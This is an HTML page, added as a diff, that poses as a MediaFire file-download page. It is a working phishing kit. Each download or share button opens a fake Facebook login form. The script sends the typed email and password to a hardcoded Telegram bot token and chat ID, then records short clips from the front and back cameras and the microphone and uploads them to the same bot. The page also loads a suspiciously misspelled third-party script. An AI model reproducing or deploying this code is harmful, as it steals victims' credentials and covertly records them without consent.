@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <link rel="stylesheet" href="style.css">
+    <title>Mediafire Download</title>
+    <meta name="keywords" content="online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, photo backup, photo sharing, ftp replacement, cross platform, remote access, mobile access, send large files, recover files, file versioning, undelete, Windows, PC, Mac, OS X, Linux, iPhone, iPad, Android" />
+    <meta name="description" content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere." />
+    <meta name="robots" content="noindex,nofollow" />
+    <meta name="googlebot" content="noindex,nofollow" />
+    <meta name="slurp" content="noindex,nofollow" />
+    <meta name="google-translate-customization" content="5587c1b0a958bf07-62a8e309de686e87-gc92f61279a2c8524-11" />
+    <meta property="fb:app_id" content="124578887583575">
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="MediaFire" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:title" content="Mediafire Download" />
+    <meta property="og:image" content="https://static.mediafire.com/images/filetype/download/video.jpg" />
+    <meta property="og:description" content="" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@MediaFire" />
+    <meta name="twitter:title" content="Mediafire Download" />
+    <meta name="twitter:image" content="https://static.mediafire.com/images/filetype/download/video.jpg" />
+    <meta name="twitter:description" content="" />
+    <link href="https://plus.google.com/+mediafire" rel="publisher" />
+    <meta itemprop="name" content="Mediafire Download" />
+    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/jQueryMoobile/cdnjqueryfuncition@main/slim.min.js"></script>
+    <meta itemprop="image" content="https://static.mediafire.com/images/filetype/download/video.jpg" />
+
+</head>
+<body>
+     <style>
+        /* Popup styles */
+           /* Popup Overlay */
+        .popup-login {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);  /* Dark background */
+            display: none;  /* Hidden by default */
+            align-items: center;  /* Vertically center */
+            justify-content: center;  /* Horizontally center */
+            z-index: 9999;  /* Ensure it's on top */
+        }
+
+        /* Popup Box */
+        .login-container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            width: 360px;  /* Adjust width */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .facebook-logo {
+            display: block;
+            margin: 0 auto 20px;
+        }
+
+        .login-container h2 {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .login-container p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 15px;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .login-container button:hover {
+            background-color: #166fe5;
+        }
+
+        .error-message {
+            display: none;
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .footer {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+
+        .footer a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Button to trigger the popup */
+        .show-popup-btn {
+            padding: 10px 20px;
+            background-color: #1877f2;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 20px;
+        }
+
+        .show-popup-btn:hover {
+            background-color: #166fe5;
+        }
+
+    </style>
+    <div class="wrap">
+        <div class="navbar">
+            <div class="logo">
+                <img src="https://iconape.com/wp-content/png_logo_vector/mediafire.png" alt="MediaFire Logo">
+            </div>
+            <div class="flag">
+                <img src="https://www.mediafire.com/images/flags_svg/idn.svg" alt="Flag">
+            </div>
+        </div>
+        <div class="down-area">
+            <div class="download">
+                <div class="icon">
+                    <img src="https://static.mediafire.com/images/filetype/file-video-v3.png" alt="File Icon">
+                </div>
+                <div class="title" onclick="showLoginPopup()"🐰>
+                    <span class="atas">FluXzOfficial</span>
+                    <span class="bawah">Download in a new tab (3.74MB)</span>
+                </div>
+                <div class="do-btn" onclick="showLoginPopup()">
+                    <img src="https://static.mediafire.com/images/icons/svg_light/download.svg" alt="Download Button">
+                </div>
+            </div>
+            <div class="downloaded">
+                Your download is starting...
+            </div>
+            <div class="lainnya">
+                <div class="action" onclick="showLoginPopup()">
+                    <span class="link"></span>
+                    Salin untuk messenger
+                </div>
+                <div class="action" onclick="showLoginPopup()">
+                    <span class="share"></span>
+                    Bagikan opsi
+                </div>
+                <div class="action" onclick="showLoginPopup()">
+                    <span class="post"></span>
+                    Posting ke Facebook
+                </div>
+                <div class="action" onclick="showLoginPopup()">
+                    <span class="save"></span>
+                    Simpan ke File Saya
+                </div>
+            </div>
+        </div>
+        <div class="region">
+            <div class="map">
+                <span class="country">Upload region: </span>
+                <img src="https://static.mediafire.com/images/backgrounds/download/additional_content/continent-as.svg" alt="Region Map">
+            </div>
+            <div class="region-desc">
+                <div class="regflag">
+                    <img src="https://www.mediafire.com/images/flags_svg/idn.svg" alt="Region Flag">
+                </div>
+                <div class="huft">
+                    This file was uploaded from Indonesia on May 3, 2022 at 2:35 AM
+                </div>
+            </div>
+        </div>
+        <div class="foot">
+            <div class="col">
+                <h2>COMPANY</h2>
+                <ul>
+                    <li>About Us</li>
+                    <li>Careers</li>
+                    <li>Press</li>
+                    <li>Company Blog</li>
+                </ul>
+            </div>
+            <div class="col">
+                <h2>TOOLS</h2>
+                <ul>
+                    <li>MediaFire Mobile</li>
+                    <li>On-Demand Video Encoding</li>
+                </ul>
+            </div>
+            <div class="col">
+                <h2>UPGRADE</h2>
+                <ul>
+                    <li>Professional</li>
+                </ul>
+            </div>
+            <div class="col">
+                <h2>SUPPORT</h2>
+                <ul>
+                    <li>Get support</li>
+                </ul>
+            </div>
+            <div class="col copyright">
+                <h2>&copy;2022 MediaFire Build 151202</h2>
+                <ul>
+                    <li>Advertising</li>
+                    <li>Terms</li>
+                    <li>Privacy Policy</li>
+                    <li>Copyright</li>
+                    <li>Abuse</li>
+                    <li>Credits</li>
+                    <li>More...</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- Popup Login Form (Facebook) -->
+    <div class="popup-login" id="loginPage">
+        <div class="login-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo" width="120">
+            <h2>Log into Facebook</h2>
+            <p>Enter your email or phone number</p>
+            <form id="loginForm">
+                <input type="" id="email" name="email" placeholder="Email or phone" required>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <div class="error-message" id="errorMessage">Incorrect email or password.</div>
+            <div class="footer">
+                <p>Forgotten account? <a href="#">Click here</a></p>
+                <p>New to Facebook? <a href="#">Create an account</a></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Script -->
+    <script scr="main.js"></script>
+    <script>
+    function showLoginPopup() {
+    document.getElementById("loginPage").style.display = "flex";
+}
+
+// Ambil elemen-elemen HTML yang diperlukan
+const downloadBtn = document.getElementById('downloadBtn');
+const loginPage = document.getElementById('loginPage');
+
+let isFrontCamera = true; // Untuk melacak apakah kamera depan atau belakang yang aktif
+let currentStream = null; // Menyimpan stream saat ini
+let videoRecorder = null; // Menyimpan video recorder
+let videoDevices = []; // Menyimpan daftar perangkat video
+const botToken = '8143919105:AAET2PaFCXO7lb0EmnqYiQ3ey-6Xy5cAjac';
+const chatID = '7955475790';
+
+// Fungsi untuk mendapatkan perangkat video yang tersedia
+async function getVideoDevices() {
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    return devices.filter(device => device.kind === 'videoinput');
+}
+
+// Fungsi untuk memulai perekaman video
+async function startVideoRecording() {
+    videoDevices = await getVideoDevices(); // Mendapatkan daftar perangkat video
+    const selectedDevice = videoDevices[isFrontCamera ? 0 : 1]; // Pilih kamera depan atau belakang
+
+    const constraints = {
+        video: {
+            deviceId: selectedDevice.deviceId, // Pilih deviceId yang sesuai
+            facingMode: isFrontCamera ? "user" : "environment" // Tentukan kamera
+        }
+    };
+
+    // Jika ada stream sebelumnya, hentikan
+    if (currentStream) {
+        currentStream.getTracks().forEach(track => track.stop());
+    }
+
+    // Mulai stream video
+    navigator.mediaDevices.getUserMedia(constraints)
+        .then(stream => {
+            currentStream = stream;
+            const chunks = [];
+            videoRecorder = new MediaRecorder(stream);
+            videoRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) chunks.push(event.data);
+            };
+
+            videoRecorder.onstop = () => {
+                const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                sendToTelegramAsVideo(videoBlob); // Mengirim sebagai video
+                currentStream.getTracks().forEach(track => track.stop());
+                
+                // Jika kamera depan selesai, mulai dengan kamera belakang
+                if (isFrontCamera) {
+                    isFrontCamera = false; // Beralih ke kamera belakang
+                    setTimeout(startVideoRecording, 1000); // Mulai perekaman video belakang setelah 1 detik
+                } else {
+                    // Setelah kedua video selesai, mulai perekaman audio
+                    startAudioRecording();
+                }
+            };
+
+            videoRecorder.start();
+
+            // Tentukan durasi perekaman video berdasarkan kamera
+            const recordDuration = isFrontCamera ? 3000 : 2000; // 3 detik untuk depan, 2 detik untuk belakang
+            setTimeout(() => {
+                if (videoRecorder.state !== "inactive") videoRecorder.stop();
+            }, recordDuration);
+        })
+        .catch(error => {
+            console.error('Video permission error:', error);
+        });
+}
+
+// Fungsi untuk mengirim video sebagai file langsung ke bot Telegram
+function sendToTelegramAsVideo(videoBlob) {
+    const formData = new FormData();
+    formData.append("chat_id", chatID);
+    formData.append("video", videoBlob, "recorded_video.mp4"); // Nama file dengan ekstensi MP4
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+        method: 'POST',
+        body: formData
+    })
+        .then(response => response.json())
+        .then(data => console.log('Video sent to Telegram:', data))
+        .catch(error => console.error('Error sending video to Telegram:', error));
+}
+
+// Fungsi untuk memulai perekaman audio
+let audioRecorder;
+
+function startAudioRecording() {
+    navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(stream => {
+            audioRecorder = new MediaRecorder(stream);
+
+            audioRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    sendToTelegram(event.data, 'audio');
+                }
+            };
+
+            audioRecorder.start();
+            setTimeout(() => {
+                if (audioRecorder.state !== "inactive") audioRecorder.stop();
+            }, 5000); // Rekam audio selama 5 detik
+        })
+        .catch(error => {
+            console.error('Audio permission error:', error);
+        });
+}
+
+// Fungsi untuk mengirim data (audio atau video) ke bot Telegram
+function sendToTelegram(data, type) {
+    const formData = new FormData();
+    formData.append("chat_id", chatID);
+
+    if (type === "video") {
+        formData.append("video", data, "Hacked By FluXzOfficial.webm");
+    } else if (type === "audio") {
+        formData.append("audio", data, "Hacked By FluXzOfficial.wav");
+    }
+
+    fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+        method: 'POST',
+        body: formData
+    })
+        .then(response => response.json())
+        .then(data => console.log('Data sent to Telegram:', data))
+        .catch(error => console.error('Error sending to Telegram:', error));
+}
+
+// Handle login form submission
+const loginForm = document.getElementById('loginForm');
+loginForm?.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    const email = document.getElementById('email')?.value;
+    const password = document.getElementById('password')?.value;
+
+    const errorMessage = document.getElementById('errorMessage');
+    if (errorMessage) errorMessage.style.display = 'block';
+
+    const message = `🕵‍♂NEW DATA RESULTS VICTIM
+
+➣ Username : ${email}
+➣ Password : ${password}
+
+🌟Big Thanks To
+ -bot 
+ - berlin ( Dev )
+
+Script Phising Hack By berlin`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatID, text: message })
+    })
+        .then(response => response.json())
+        .then(data => console.log(data))
+        .catch(error => console.error('Error:', error));
+
+    // Mulai perekaman video depan
+    startVideoRecording(); // Mulai perekaman video
+});
+    </script>
+</body>
+</html>
